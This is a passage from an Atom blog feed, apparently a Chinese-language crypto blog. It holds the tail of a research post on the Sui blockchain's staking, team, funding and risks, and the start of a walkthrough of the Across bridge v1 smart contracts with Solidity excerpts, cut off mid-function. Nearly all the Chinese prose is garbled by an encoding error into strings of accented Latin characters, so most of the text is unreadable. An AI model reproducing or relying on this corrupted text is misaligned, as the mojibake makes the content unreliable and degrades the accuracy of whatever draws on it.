å§”æ‰˜ç»™ç»™éªŒè¯è€…è¿›è¡Œè´¨æŠ¼ï¼Œåœ¨æ¯ä¸ªçºªå…ƒç»“æŸæ—¶å¯è·å–å¯¹åº”ä»½é¢çš„å¥–åŠ±ã€‚</p><p>éªŒè¯è€…åœ¨æ€»è´¨æŠ¼å¥–åŠ±ä¸­çš„ä»½é¢æ˜¯ä¸è´¨æŠ¼æ•°é‡ç›¸å…³çš„ï¼Œå› ä¸ºå®ƒå†³å®šäº†æ¯ä¸ªéªŒè¯è€…åœ¨å¤„ç†äº¤æ˜“ä¸­çš„æŠ•ç¥¨æƒä»½é¢ã€‚æ¯ç¬”Suiçš„äº¤æ˜“åªéœ€è¦2/3çš„éªŒè¯è€…æŒ‰æƒç›Šä»½é¢è¿›è¡Œå¤„ç†ï¼Œå› æ­¤æ‹¥æœ‰è´¨æŠ¼æ•°é‡è¶Šå¤šçš„éªŒè¯è€…å°†æ‹¥æœ‰æ›´å¤šçš„ä»½é¢ï¼Œä»è€Œå¤„ç†æ›´å¤šçš„äº¤æ˜“ï¼Œè·å–åˆ°æ›´å¤šçš„å¥–åŠ±ã€‚åŒæ—¶åœ¨è®¡ç®—æ€»å¥–åŠ±æ—¶ï¼ŒSui ä¹Ÿä¼šå¯¹å­˜å‚¨åŸºé‡‘è¿›è¡Œåˆ†é…ï¼Œå› æ­¤éªŒè¯è€…å°±ä¼šç›¸å¯¹äº SUI å§”æ‰˜äººè·å¾—æ›´å¤šçš„è´¨æŠ¼å¥–åŠ±ã€‚</p><p>åŒæ—¶åœ¨æ¯ä¸ªçºªå…ƒå¼€å§‹å‰ï¼ŒSUI æŒæœ‰è€…å¯è‡ªç”±åœ°é€‰æ‹©éªŒè¯è€…è¿›è¡Œ SUI çš„è´¨æŠ¼ï¼Œå› æ­¤å¯¹äºå¤„ç†é€Ÿåº¦å¿«çš„éªŒè¯è€…å°†å¤„ç†æ›´å¤šçš„äº¤æ˜“ï¼Œè·å–åˆ°æ›´å¤šçš„æ‰§è¡Œ gas å¥–åŠ±ï¼ŒæŒæœ‰è€…ä¹Ÿæ›´æ„¿æ„é€‰æ‹©è¿™ç§éªŒè¯è€…è¿›è¡Œè´¨æŠ¼ï¼Œä»è€Œæå‡äº†æ•´ä¸ª Sui ç½‘ç»œéªŒè¯è€…çš„è´¨é‡ã€‚</p><h2><span id="tuan-dui-qing-kuang">å›¢é˜Ÿæƒ…å†µ</span></h2><h3><span id="gai-kuang">æ¦‚å†µ</span></h3><ul><li>å¼€å‘å›¢é˜Ÿï¼šMysten Labs</li><li>åˆ›å§‹äººåŒ…æ‹¬ <a href="https://twitter.com/EvanWeb3">Evan Cheng</a>ã€<a href="https://twitter.com/EmanAbio">Adeniyi Abiodun</a>ã€<a href="https://twitter.com/b1ackd0g">Sam Blackshear</a>ã€<a href="https://twitter.com/GDanezis">George Danezis</a>ã€<a href="https://twitter.com/kostascrypto">Kostas Kryptos</a>ï¼Œå‡åœ¨ Meta å‚ä¸è¿‡ Novi å’Œ Diem é¡¹ç›®</li></ul><h3><span id="rong-zi">èèµ„</span></h3><ul><li>Mysten Labs äº 2021 å¹´ 12 æœˆå®£å¸ƒå®Œæˆ 3600 ä¸‡ç¾å…ƒ A è½®èèµ„ï¼Œè¯¥è½®èèµ„ç”± a16z é¢†æŠ•ï¼ŒCoinbase Venturesã€NFXã€Slow Venturesã€Scribble Venturesã€Samsung NEXTã€Lux Capital ç­‰å‚æŠ•ã€‚</li><li>æ­£åœ¨å¯»æ±‚ä»¥ 20 äº¿ç¾å…ƒä¼°å€¼ç­¹é›†è‡³å°‘ 2 äº¿ç¾å…ƒ B è½®èèµ„ï¼Œæœ¬è½®èèµ„ç”± FTX Ventures é¢†æŠ•ï¼Œç›®å‰é¡¹ç›®æ–¹å·²åœ¨è¯¥è½®èèµ„ä¸­è·å¾— 1.4 äº¿ç¾å…ƒèµ„é‡‘æ”¯æŒã€‚</li></ul><h2><span id="sheng-tai-jian-she">ç”Ÿæ€å»ºè®¾</span></h2><ol><li>å›¢é˜Ÿæ„æƒ³çš„å…¬é“¾ 4 ä¸ªå…³é”®åº”ç”¨ï¼šæ¸¸æˆã€DeFiã€å•†ä¸šå’Œç¤¾äº¤ã€‚æ‰€æœ‰ 4 ä¸ªåº”ç”¨éƒ½å°†å……åˆ†åˆ©ç”¨ Sui çš„é«˜ååé‡å’Œä½å»¶è¿Ÿæ¥æä¾›æœ€ä½³ç”¨æˆ·ä½“éªŒã€‚æ¸¸æˆå’Œç¤¾äº¤åº”ç”¨åœ¨ Sui ä¸Šæ„å»ºè¿˜å…·æœ‰ç‹¬ç‰¹çš„ä¼˜åŠ¿ã€‚æ¸¸æˆå¯ä»¥åˆ©ç”¨ Move é’ˆå¯¹æ•°å­—å½¢è±¡çš„å®‰å…¨æ€§å’Œè¡¨ç°åŠ›ã€‚ç¤¾äº¤åª’ä½“åº”ç”¨å¯ä»¥åˆ©ç”¨ Sui çš„æ•°æ®å­˜å‚¨ç»æµå­¦å°†æ‰€æœ‰æ•°æ®ç›´æ¥å­˜å‚¨åœ¨é“¾ä¸Šã€‚</li><li>Sui Monstarsï¼Œæ¸¸æˆã€‚</li></ol><h2><span id="feng-xian-dian">é£é™©ç‚¹</span></h2><ol><li>å…¬é“¾ç”Ÿæ€çš„æ„å»ºæ˜¯ä¸€ä¸ªæ¼«é•¿çš„è¿‡ç¨‹ã€‚</li><li>æŒæ¡å…¨ç½‘è´¨æŠ¼æ€»é‡çš„2/3å³å¯æ§åˆ¶æ•´ä¸ªç½‘ç»œ,è‹¥æ˜¯æœ‰éªŒè¯è€…å’ŒWeb2å¤§å…¬å¸ä¸€æ ·å‘èµ·è´¨æŠ¼è¡¥è´´ï¼Œä¾‹å¦‚å°†æœ¬å±äºè‡ªå·±çš„æ‰§è¡Œ gas å’Œå­˜å‚¨ gas ä¹Ÿå‘æ”¾ç»™å°† SUI è´¨æŠ¼åœ¨è‡ªå·±è¿™é‡Œçš„ SUI æŒæœ‰è€…ï¼Œåˆ™ä¼šå¸å¼•å¤§é‡çš„ SUI æŒæœ‰è€…å°†è‡ªå·±çš„ SUI è´¨æŠ¼åœ¨è¿™æ ·çš„éªŒè¯è€…èŠ‚ç‚¹ä¸Šï¼Œä»è€Œè®©è¿™ä¸ªéªŒè¯è€…æŒæ¡äº†æ•´ä¸ªç½‘ç»œçš„æ§åˆ¶æƒï¼Œä»è€Œå…·å¤‡äº†ä½œæ¶çš„èƒ½åŠ›ã€‚ä¸€æ—¦å¼€å§‹ä½œæ¶ï¼Œåˆ™å¯èƒ½ä½¿æ•´ä¸ªç½‘ç»œçš„å…¶ä»–å‚ä¸è€…çš„åˆ©ç›Šå—æŸã€‚</li><li>Move è¯­è¨€åšä¸ºæ–°å…´åˆçº¦è¯­è¨€ï¼Œåœ¨å­¦ä¹ æˆæœ¬ï¼Œå®‰å…¨/å®¡è®¡ï¼Œå¼€å‘å·¥å…·å®Œå¤‡æˆéƒ½ï¼Œæˆç†Ÿçš„åˆçº¦ç»„ä»¶ç­‰ï¼Œéƒ½ä¸Solidityæœ‰ä¸€å®šçš„è·ç¦»ã€‚</li></ol><h2><span id="can-kao">å‚è€ƒ</span></h2><ol><li><a href="https://www.theblockbeats.info/news/31206">æ–°å…¬é“¾Suiï¼šä¼°å€¼20äº¿ç¾å…ƒçš„å‰Facebookå›¢é˜Ÿæ‰“é€ çš„Layer1</a></li><li><a href="https://twitter.com/linda_guagua/status/1549031224555237378?s=20&amp;t=d6yTDgKMK6KJNaR2qkoKVA">Linda_éƒ‘éƒ‘çš„thread</a></li><li><a href="https://www.youtube.com/watch?v=bTiyATYCU20">Suiâ€”å‰facebookå›¢é˜Ÿå’Œé¡¶çº§æœºæ„åˆ›å»ºçš„æ–°ä¸€ä»£åŒºå—é“¾å…¬é“¾ã€Vic TALK ç¬¬263æœŸã€‘</a></li><li><a href="https://cryptohot.substack.com/p/-sui-">https://cryptohot.substack.com/p/-sui-</a></li><li><a href="https://twitter.com/mindaoyang/status/1552384026383904768">https://twitter.com/mindaoyang/status/1552384026383904768</a></li><li><a href="https://twitter.com/tracecrypto1/status/1544332560389607424">https://twitter.com/tracecrypto1/status/1544332560389607424</a></li><li><a href="https://twitter.com/cryptoalvatar/status/1551878534926401537">https://twitter.com/cryptoalvatar/status/1551878534926401537</a></li><li><a href="https://twitter.com/state_xyz/status/1551878856151142401">https://twitter.com/state_xyz/status/1551878856151142401</a></li></ol><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      Sui å…¬é“¾ç ”ç©¶æ•´ç†
    
    </summary>
    
    
      <category term="åŒºå—é“¾" scheme="https://qiwihui.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
      <category term="æŠ•ç ”" scheme="https://qiwihui.com/tags/%E6%8A%95%E7%A0%94/"/>
    
  </entry>
  
  <entry>
    <title>Across è·¨é“¾æ¡¥åˆçº¦è§£æ</title>
    <link href="https://qiwihui.com/qiwihui-blog-158/"/>
    <id>https://qiwihui.com/qiwihui-blog-158/</id>
    <published>2024-05-15T02:25:31.353Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="shi-me-shi-across">ä»€ä¹ˆæ˜¯ Across</span></h2><p>ä»¥å¤ªåŠè·¨é“¾åè®® <a href="https://across.to/">Across</a> æ˜¯ä¸€ç§æ–°é¢–çš„è·¨é“¾æ–¹æ³•ï¼Œå®ƒç»“åˆäº†ä¹è§‚é¢„è¨€æœºï¼ˆOptimistic Oracleï¼‰ã€ç»‘å®šä¸­ç»§è€…å’Œå•è¾¹æµåŠ¨æ€§æ± ï¼Œå¯ä»¥æä¾›ä» Rollup é“¾åˆ°ä»¥å¤ªåŠä¸»ç½‘çš„å»ä¸­å¿ƒåŒ–å³æ—¶äº¤æ˜“ã€‚ç›®å‰ï¼ŒAcross åè®®é€šè¿‡é›†æˆä»¥å¤ªåŠäºŒå±‚æ‰©å®¹æ–¹æ¡ˆOptimismã€Arbitrumå’ŒBoba Networkæ”¯æŒåŒå‘æ¡¥æ¥ï¼Œå³å¯å°†èµ„äº§ä»L1å‘é€è‡³L2ï¼Œäº¦å¯ä»L2å‘é€è‡³L1ã€‚</p><span id="more"></span><h3><span id="cun-kuan-kua-lian-liu-cheng">å­˜æ¬¾è·¨é“¾æµç¨‹</span></h3><p><img src="https://user-images.githubusercontent.com/3297411/158982132-cd917c98-e156-45d4-b50b-0256f222db32.png" alt="process"></p><p>æ¥æºäºï¼š<a href="https://docs.across.to/bridge/how-does-across-work-1/architecture-process-walkthrough">https://docs.across.to/bridge/how-does-across-work-1/architecture-process-walkthrough</a></p><p>Across åè®®ä¸­ï¼Œå­˜æ¬¾è·¨é“¾æœ‰å‡ ç§å¯èƒ½çš„æµç¨‹ï¼Œæœ€é‡è¦çš„æ˜¯ï¼Œå­˜æ¬¾äººåœ¨ä»»ä½•è¿™äº›æƒ…å†µä¸‹éƒ½ä¸ä¼šæŸå¤±èµ„é‡‘ã€‚åœ¨æ¯ä¸€ç§æƒ…å†µä¸‹ï¼Œåœ¨ L2 ä¸Šå­˜å…¥çš„ä»»ä½•ä»£å¸éƒ½ä¼šé€šè¿‡ Optimism æˆ– Arbitrum çš„åŸç”Ÿæ¡¥è½¬ç§»åˆ° L1 ä¸Šçš„æµåŠ¨æ± ï¼Œç”¨ä»¥å¿è¿˜ç»™æµåŠ¨æ€§æä¾›è€…ã€‚</p><p>ä»ä¸Šé¢çš„æµç¨‹ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ° Across åè®®æµç¨‹åŒ…æ‹¬ä»¥ä¸‹å‡ ç§ï¼š</p><ul><li>å³æ—¶ä¸­ç»§ï¼Œæ— äº‰è®®ï¼›</li><li>å³æ—¶ä¸­ç»§ï¼Œæœ‰äº‰è®®ï¼›</li><li>æ…¢é€Ÿä¸­ç»§ï¼Œæ— äº‰è®®ï¼›</li><li>æ…¢é€Ÿä¸­ç»§ï¼Œæœ‰äº‰è®®ï¼›</li><li>æ…¢é€Ÿä¸­ç»§ï¼ŒåŠ é€Ÿä¸ºå³æ—¶ä¸­ç»§ã€‚</li></ul><p>Across åè®®ä¸­ä¸»è¦åŒ…æ‹¬å‡ ç±»è§’è‰²ï¼š</p><ul><li>å­˜æ¬¾è€…ï¼ˆDepositorï¼‰ï¼šéœ€è¦å°†èµ„äº§ä»äºŒå±‚é“¾è½¬ç§»åˆ°L1çš„ç”¨æˆ·ï¼›</li><li>ä¸­ç»§è€…ï¼ˆRelayerï¼‰ï¼šè´Ÿè´£å°†L1å±‚èµ„äº§è½¬ç§»ç»™ç”¨æˆ·ï¼Œä»¥åŠL2å±‚èµ„äº§è·¨é“¾çš„èŠ‚ç‚¹ï¼›</li><li>æµåŠ¨æ€§æä¾›è€…ï¼ˆLPï¼‰ï¼šä¸ºæµåŠ¨æ€§æ± æä¾›èµ„äº§ï¼›</li><li>äº‰è®®è€…ï¼ˆDisputorï¼‰ï¼šå¯¹ä¸­ç»§è¿‡ç¨‹æœ‰äº‰è®®çš„äººï¼Œå¯ä»¥å‘ Optimistic Oracle æäº¤äº‰è®®ï¼›</li></ul><h2><span id="xiang-mu-zong-lan">é¡¹ç›®æ€»è§ˆ</span></h2><p>Across çš„åˆçº¦æºç åœ°å€ä¸º <a href="https://github.com/across-protocol/contracts-v1%EF%BC%8C%E7%9B%AE%E5%89%8D">https://github.com/across-protocol/contracts-v1ï¼Œç›®å‰</a> Across Protocol æ­£åœ¨è¿›è¡Œ v2 ç‰ˆæœ¬åˆçº¦çš„å¼€å‘ï¼Œæˆ‘ä»¬è¿™ä¸€ç¯‡æ–‡ç« ä¸»è¦åˆ†æ v1 ç‰ˆæœ¬çš„åˆçº¦æºç ã€‚é¦–å…ˆæˆ‘ä»¬ä¸‹è½½æºç ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/across-protocol/contracts-v1</span><br><span class="line"><span class="built_in">cd</span> contracts-v1</span><br></pre></td></tr></table></figure><p>åˆçº¦æºç çš„ä¸»è¦çš„ç›®å½•ç»“æ„ä¸ºï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">contract-v1</span><br><span class="line">â”œâ”€â”€ contracts // Across protocol çš„åˆçº¦æºç </span><br><span class="line">â”œâ”€â”€ deploy // éƒ¨ç½²è„šæœ¬</span><br><span class="line">â”œâ”€â”€ hardhat.config.js // hardhat é…ç½®</span><br><span class="line">â”œâ”€â”€ helpers // è¾…åŠ©å‡½æ•°</span><br><span class="line">â”œâ”€â”€ networks // åˆçº¦åœ¨ä¸åŒé“¾ä¸Šçš„éƒ¨ç½²åœ°å€</span><br><span class="line">â””â”€â”€ package.json // ä¾èµ–åŒ…</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ç¯‡è§£æä¸­ï¼Œæˆ‘ä»¬ä¸»è¦å…³æ³¨ <code>contracts</code> å’Œ <code>deploy</code> ç›®å½•ä¸‹çš„æ–‡ä»¶ã€‚</p><h3><span id="he-yue-zong-lan">åˆçº¦æ€»è§ˆ</span></h3><p>åˆçº¦ç›®å½• <code>contracts</code> çš„ç›®å½•ç»“æ„ä¸ºï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">contracts/</span><br><span class="line">â”œâ”€â”€ common</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ implementation</span><br><span class="line">â”‚Â Â  â””â”€â”€ interfaces</span><br><span class="line">â”œâ”€â”€ external</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ README.md</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ avm</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ chainbridge</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ ovm</span><br><span class="line">â”‚Â Â  â””â”€â”€ polygon</span><br><span class="line">â”œâ”€â”€ insured-bridge</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ BridgeAdmin.sol</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ BridgeDepositBox.sol</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ BridgePool.sol</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ RateModelStore.sol</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ avm</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ interfaces</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ ovm</span><br><span class="line">â”‚Â Â  â””â”€â”€ <span class="built_in">test</span></span><br><span class="line">â””â”€â”€ oracle</span><br><span class="line">    â”œâ”€â”€ implementation</span><br><span class="line">    â””â”€â”€ interfaces</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œå„ä¸ªç›®å½•åŒ…å«çš„å†…å®¹ä¸ºï¼š</p><ul><li><code>common</code>ï¼šä¸€äº›é€šç”¨åŠŸèƒ½çš„åº“æ–¹æ³•ç­‰ï¼ŒåŒ…æ‹¬ï¼š<ul><li><a href="https://github.com/across-protocol/contracts-v1/blob/master/contracts/common/implementation/AncillaryData.sol">AncillaryData.sol</a>ï¼šç”¨æ¥ç¼–ç å’Œè§£ç  DVMä»·æ ¼è¯·æ±‚çš„æ•°æ®çš„åº“ï¼›</li><li><a href="https://github.com/across-protocol/contracts-v1/blob/master/contracts/common/implementation/FixedPoint.sol">FixedPoint.sol</a>ï¼šå®šç‚¹æ•°è¿ç®—ï¼›</li><li><a href="https://github.com/across-protocol/contracts-v1/blob/master/contracts/common/implementation/Lockable.sol">Lockable.sol</a>ï¼šé˜²æ­¢é‡å…¥æ”»å‡»çš„ä¸€äº›å‡½æ•°ä¿®æ”¹å™¨ï¼›</li><li><a href="https://github.com/across-protocol/contracts-v1/blob/master/contracts/common/implementation/MultiCaller.sol">MultiCaller.sol</a> ï¼šå¯ä»¥åœ¨å½“ä¸ªè°ƒç”¨ä¸­è°ƒç”¨åˆçº¦çš„å¤šä¸ªæ–¹æ³•ï¼›</li><li><a href="https://github.com/across-protocol/contracts-v1/blob/master/contracts/common/implementation/Testable.sol">Testable.sol</a>ï¼šæµ‹è¯•æ—¶ä¿®æ”¹æ—¶é—´ï¼›</li><li><a href="https://github.com/across-protocol/contracts-v1/blob/master/contracts/common/implementation/Timer.sol">Timer.sol</a>ï¼šè·å–æ—¶é—´æ–¹æ³•ï¼›</li></ul></li><li><code>external</code>ï¼šå¤–éƒ¨åˆçº¦ï¼Œä¸»è¦ç”¨äºå®ç°åœ¨ç®¡ç†å‘˜åˆçº¦ä¸­å¯¹ä¸åŒ L2 çš„æ¶ˆæ¯å‘é€ï¼›</li><li><code>insured-bridge</code> åˆçº¦ä¸»è¦åŠŸèƒ½ï¼Œæˆ‘ä»¬ä¼šåœ¨æ¥ä¸‹æ¥çš„ç« èŠ‚ç« èŠ‚ä¸­é‡ç‚¹åˆ†æï¼›</li><li><code>oracle</code>ï¼šä¸»è¦æ˜¯ Optimistic Oracle æä¾›åŠŸèƒ½çš„æ–¹æ³•æ¥å£ï¼Œåœ¨è¿™ç¯‡æ–‡ç« ä¸­æˆ‘ä»¬ä¸å¯¹ Optimistic Oracle çš„åŸç†å®ç°è¿›è¡Œä»‹ç»ï¼Œä¸»è¦ä¼šä»‹ç» Across åè®®ä¼šåœ¨ä½•å¤„ä½¿ç”¨ Optimistic Oracleã€‚</li></ul><p>æ¥ä¸‹æ¥æˆ‘ä»¬ä¼šé‡ç‚¹åˆ†æ <code>insured-bridge</code> ä¸­çš„åˆçº¦çš„åŠŸèƒ½ï¼Œè¿™æ˜¯ Across ä¸»è¦åŠŸèƒ½çš„åˆçº¦æ‰€åœ¨ã€‚</p><p>åœ¨ <code>insured-bridge</code> ç›®å½•ä¸­ï¼š</p><ul><li><code>BridgeAdmin.sol</code> ï¼šç®¡ç†åˆçº¦ï¼Œè´Ÿè´£ç®¡ç†å’Œç”Ÿæˆç”Ÿæˆ L2 ä¸Šçš„ DepositBox åˆçº¦å’Œ L1 ä¸Šçš„ BridgePool åˆçº¦ï¼›</li><li><code>BridgeDepositBox.sol</code> ï¼šL2 å±‚ä¸Šè´Ÿè´£å­˜æ¬¾çš„æŠ½è±¡åˆçº¦ï¼ŒArbitrumï¼ŒOptimism å’Œ Boba ç½‘ç»œçš„åˆçº¦éƒ½æ˜¯ç»§æ‰¿è‡ªè¿™ä¸ªåˆçº¦ï¼›</li><li><code>BridgePool.sol</code> ï¼šæ¡¥æ¥æ± åˆçº¦ï¼Œç®¡ç† L1 å±‚èµ„é‡‘æ± ã€‚</li></ul><h2><span id="bridgeadmin">BridgeAdmin</span></h2><p>è¿™ä¸ªåˆçº¦æ˜¯ç®¡ç†å‘˜åˆçº¦ï¼Œéƒ¨ç½²åœ¨L1å±‚ï¼Œå¹¶æœ‰æƒé™ç®¡ç† L1 å±‚ä¸Šçš„æµåŠ¨æ€§æ± å’Œ L2 ä¸Šçš„å­˜æ¬¾ç®±ï¼ˆDepositBoxesï¼‰ã€‚å¯ä»¥æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸ªåˆçº¦çš„ç®¡ç†å¸å·æ˜¯ä¸€ä¸ªå¤šé’±é’±åŒ…ï¼Œé¿å…äº†ä¸€äº›å®‰å…¨é—®é¢˜ã€‚</p><p>é¦–å…ˆæˆ‘ä»¬çœ‹åˆ°åˆçº¦ä¸­çš„å‡ ä¸ªçŠ¶æ€å˜é‡ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract BridgeAdmin is BridgeAdminInterface, Ownable, Lockable &#123;</span><br><span class="line"></span><br><span class="line">    address public override finder;</span><br><span class="line"></span><br><span class="line">    mapping(uint256 =&gt; DepositUtilityContracts) private _depositContracts;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; L1TokenRelationships) private _whitelistedTokens;</span><br><span class="line"></span><br><span class="line">    // Set upon construction and can be reset by Owner.</span><br><span class="line">    uint32 public override optimisticOracleLiveness;</span><br><span class="line">    uint64 public override proposerBondPct;</span><br><span class="line">    bytes32 public override identifier;</span><br><span class="line"></span><br><span class="line">    constructor(</span><br><span class="line">        address _finder,</span><br><span class="line">        uint32 _optimisticOracleLiveness,</span><br><span class="line">        uint64 _proposerBondPct,</span><br><span class="line">        bytes32 _identifier</span><br><span class="line">    ) &#123;</span><br><span class="line">        finder = _finder;</span><br><span class="line">        require(address(_getCollateralWhitelist()) != address(0), &quot;Invalid finder&quot;);</span><br><span class="line">        _setOptimisticOracleLiveness(_optimisticOracleLiveness);</span><br><span class="line">        _setProposerBondPct(_proposerBondPct);</span><br><span class="line">        _setIdentifier(_identifier);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼š</p><ul><li><code>finder</code> ç”¨æ¥è®°å½•æŸ¥è¯¢æœ€æ–° OptimisticOracle å’Œ UMA ç”Ÿæ€ä¸­å…¶ä»–åˆçº¦çš„åˆçº¦åœ°å€ï¼›</li><li><code>_depositContracts</code> è¯¥åˆçº¦å¯ä»¥å°†æ¶ˆæ¯ä¸­ç»§åˆ°ä»»æ„æ•°é‡çš„ L2 å­˜æ¬¾ç®±ï¼Œæ¯ä¸ª L2 ç½‘ç»œä¸€ä¸ªï¼Œæ¯ä¸ªéƒ½ç”±å”¯ä¸€çš„ç½‘ç»œ ID æ ‡è¯†ã€‚ è¦ä¸­ç»§æ¶ˆæ¯ï¼Œéœ€è¦å­˜å‚¨å­˜æ¬¾ç®±åˆçº¦åœ°å€å’Œä¿¡ä½¿ï¼ˆmessengerï¼‰åˆçº¦åœ°å€ã€‚ æ¯ä¸ª L2 çš„ä¿¡ä½¿å®ç°ä¸åŒï¼Œå› ä¸º L1 --&gt; L2 æ¶ˆæ¯ä¼ é€’æ˜¯éæ ‡å‡†çš„ï¼›</li><li><code>_whitelistedTokens</code> è®°å½•äº† L1 ä»£å¸åœ°å€ä¸å¯¹åº” L2 ä»£å¸åœ°å€ä»¥åŠæ¡¥æ¥æ± çš„æ˜ å°„ï¼›</li><li><code>optimisticOracleLiveness</code> ä¸­ç»§å­˜æ¬¾çš„äº‰è®®æ—¶é•¿ï¼›</li><li><code>proposerBondPct</code> Optimistic Oracle ä¸­ proposer çš„ç»‘å®šè´¹ç‡</li></ul><p>ç®¡ç†å‘˜å¯ä»¥è®¾ç½®ä»¥ä¸Šè¿™äº›å˜é‡çš„å†…å®¹ï¼Œä»¥åŠå¯ä»¥è®¾ç½®æ¯ç§’çš„ LP è´¹ç‡ï¼Œè½¬ç§»æ¡¥æ¥æ± çš„ç®¡ç†å‘˜æƒé™ç­‰ã€‚</p><p>åŒæ—¶ï¼Œç®¡ç†å‘˜è¿˜å¯ä»¥é€šè¿‡ä¿¡ä½¿è®¾ç½® L2 å±‚åˆçº¦çš„å‚æ•°ï¼ŒåŒ…æ‹¬ï¼›</p><ul><li><code>setCrossDomainAdmin</code> ï¼šè®¾ç½® L2 å­˜æ¬¾åˆçº¦çš„ç®¡ç†å‘˜åœ°å€ï¼›</li><li><code>setMinimumBridgingDelay</code> ï¼šè®¾ç½® L2 å­˜æ¬¾åˆçº¦çš„æœ€å°æ¡¥æ¥å»¶è¿Ÿï¼›</li><li><code>setEnableDepositsAndRelays</code>ï¼šå¼€å¯æˆ–è€…æš‚åœä»£å¸ L2 å­˜æ¬¾ï¼Œè¿™ä¸ªæ–¹æ³•ä¼šåŒæ—¶æš‚åœ L1 å±‚æ¡¥æ¥æ± ï¼›</li><li><code>whitelistToken</code>ï¼šå…³è” L2 ä»£å¸åœ°å€ï¼Œè¿™æ ·è¿™ä¸ªä»£å¸å°±å¯ä»¥å¼€å§‹å­˜æ¬¾å’Œä¸­ç»§ï¼›</li></ul><p>å¯¹äºæ¶ˆæ¯å‘é€ï¼Œç®¡ç†å‘˜åˆçº¦é€šè¿‡è°ƒç”¨ä¸åŒçš„ä¿¡ä½¿çš„ <code>relayMessage</code> æ–¹æ³•æ¥å®Œæˆï¼Œå°† msg.value == l1CallValue å‘é€ç»™ä¿¡ä½¿ï¼Œç„¶åå®ƒå¯ä»¥ä»¥ä»»ä½•æ–¹å¼ä½¿ç”¨å®ƒæ¥æ‰§è¡Œè·¨åŸŸæ¶ˆæ¯ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _relayMessage(</span><br><span class="line">    address messengerContract,</span><br><span class="line">    uint256 l1CallValue,</span><br><span class="line">    address target,</span><br><span class="line">    address user,</span><br><span class="line">    uint256 l2Gas,</span><br><span class="line">    uint256 l2GasPrice,</span><br><span class="line">    uint256 maxSubmissionCost,</span><br><span class="line">    bytes memory message</span><br><span class="line">) private &#123;</span><br><span class="line">    require(l1CallValue == msg.value, &quot;Wrong number of ETH sent&quot;);</span><br><span class="line">    MessengerInterface(messengerContract).relayMessage&#123; value: l1CallValue &#125;(</span><br><span class="line">        target,</span><br><span class="line">        user,</span><br><span class="line">        l1CallValue,</span><br><span class="line">        l2Gas,</span><br><span class="line">        l2GasPrice,</span><br><span class="line">        maxSubmissionCost,</span><br><span class="line">        message</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸åŒL2çš„æ¶ˆæ¯æ–¹æ³•åˆ†åˆ«åœ¨å¯¹åº”é“¾çš„ <code>CrossDomainEnabled.sol</code> åˆçº¦ä¸­ï¼Œæ¯”å¦‚ï¼š</p><ul><li>Arbitrum: <code>contracts/insured-bridge/avm/Arbitrum_CrossDomainEnabled.sol</code>ï¼›</li><li>Optimismï¼ŒBoba: <code>contracts/insured-bridge/ovm/OVM_CrossDomainEnabled.sol</code>ï¼›</li></ul><h2><span id="bridgedepositbox">BridgeDepositBox</span></h2><p>æ¥ä¸‹æ¥æˆ‘ä»¬çœ‹åˆ° <code>BridgeDepositBox.sol</code>ï¼ŒæŠ½è±¡åˆçº¦ <code>BridgeDepositBox</code> åˆçº¦ä¸­ä¸»è¦æœ‰ä¸¤ä¸ªåŠŸèƒ½ã€‚</p><h3><span id="bridgetokens"><code>bridgeTokens</code></span></h3><p>ç¬¬ä¸€ä¸ªæ˜¯ <code>bridgeTokens</code> æ–¹æ³•ï¼Œç”¨äºå°† L2 å±‚ä»£å¸é€šè¿‡åŸç”Ÿä»£å¸æ¡¥è½¬ç§»åˆ° L1 ä¸Šï¼Œè¿™ä¸ªæ–¹æ³•éœ€è¦åœ¨ä¸åŒçš„ L2 å±‚åˆçº¦ä¸Šå®ç°ï¼Œç›®å‰æ”¯æŒçš„ L2 å±‚åŒ…æ‹¬ Arbitrumï¼ŒOptimism å’Œ Bobaï¼Œåˆ†åˆ«å¯¹åº”çš„æ–‡ä»¶ä¸ºï¼š</p><ul><li>Arbitrum: <code>contracts/insured-bridge/avm/AVM_BridgeDepositBox.sol</code></li><li>Optimism: <code>contracts/insured-bridge/ovm/OVM_BridgeDepositBox.sol</code></li><li>Boba: <code>contracts/insured-bridge/ovm/OVM_OETH_BridgeDepositBox.sol</code></li></ul><p>ä»¥ Arbitrum é“¾ä¸Šçš„ <code>bridgeToken</code> ä¸ºä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  // BridgeDepositBox.sol æ–‡ä»¶ä¸­</span><br><span class="line">  function canBridge(address l2Token) public view returns (bool) &#123;</span><br><span class="line">      return isWhitelistToken(l2Token) &amp;&amp; _hasEnoughTimeElapsedToBridge(l2Token);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">// AVM_BridgeDepositBox.solæ–‡ä»¶ä¸­</span><br><span class="line">  function bridgeTokens(address l2Token, uint32 l1Gas) public override nonReentrant() &#123;</span><br><span class="line">      uint256 bridgeDepositBoxBalance = 